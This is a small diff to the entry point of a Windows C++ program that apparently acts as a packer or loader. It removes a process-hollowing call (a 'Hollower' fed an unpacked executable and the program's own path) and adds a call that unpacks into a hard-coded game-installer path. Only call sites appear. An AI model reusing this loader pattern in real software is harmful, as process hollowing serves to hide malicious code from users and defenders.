@@ -32,12 +32,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     // TODO: Place code here.
 	
 	Unpacker upack;
-	IMAGE_DOS_HEADER *exe = upack.GetExecutble();
-	wchar_t *name = (wchar_t*)malloc(sizeof(wchar_t)*256);
-	int sz=256;
-	GetModuleFileName(GetModuleHandle(NULL), name, sz);
-	Hollower *hollow = new Hollower(std::wstring(name), exe);
-	hollow->DoHollow();
+	upack.UnpackIntoProcess(L"C:\\Users\\capta\\Desktop\\WoT_internet_install_na.exe");
 
 }
 
